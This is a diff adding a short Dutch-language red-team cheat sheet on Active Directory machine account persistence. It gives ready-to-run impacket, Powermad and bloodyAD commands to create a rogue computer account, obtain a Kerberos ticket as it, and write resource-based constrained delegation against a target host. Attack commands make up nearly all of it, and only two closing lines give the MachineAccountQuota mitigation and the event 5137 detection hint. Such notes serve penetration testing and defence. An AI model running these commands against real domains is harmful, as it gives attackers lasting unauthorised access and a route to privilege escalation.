@@ -1,0 +1,35 @@
+# Machine Account Persistence — Computer accounts aanmaken
+# Standaard mogen domain users tot 10 machine accounts aanmaken
+# Machine accounts verlopen niet en hebben constante wachtwoorden
+#
+# === Vereisten ===
+# - Domain user account
+# - MachineAccountQuota > 0 (standaard: 10)
+#
+# === Voorbeelden ===
+
+# impacket addcomputer
+python3 addcomputer.py DOMAIN/USER:'PASS' -computer-name 'YOURPC$' -computer-pass 'CompPass123!' -dc-ip DC_IP
+
+# PowerMad (PowerShell)
+powershell -c "Import-Module .\Powermad.ps1; New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'CompPass123!' -AsPlainText -Force)"
+
+# Via bloodyAD
+python3 bloodyAD.py -u USER -p 'PASS' -d DOMAIN --host DC_IP add computer YOURPC 'CompPass123!'
+
+# MachineAccountQuota controleren
+python3 ldapsearch -u USER -p 'PASS' -d DOMAIN -dc DC_IP '(objectClass=domain)' ms-DS-MachineAccountQuota
+
+# Authenticeren als machine account
+python3 getTGT.py DOMAIN/'YOURPC$':'CompPass123!' -dc-ip DC_IP
+
+# Machine account gebruiken voor RBCD of andere aanvallen
+python3 rbcd.py -delegate-from 'YOURPC$' -delegate-to TARGET$ -action write DOMAIN/USER:'PASS' -dc-ip DC_IP
+
+# Verwijder machine account (opruimen)
+python3 addcomputer.py DOMAIN/USER:'PASS' -computer-name 'YOURPC$' -delete -dc-ip DC_IP
+
+# Noot: Machine accounts zijn persistent — wachtwoord verandert niet automatisch
+# Noot: Bruikbaar voor RBCD, S4U2Self, en als fallback toegang
+# Noot: Mitigatie: Set MachineAccountQuota=0
+# Noot: Detectie: Event 5137 (computer object created)
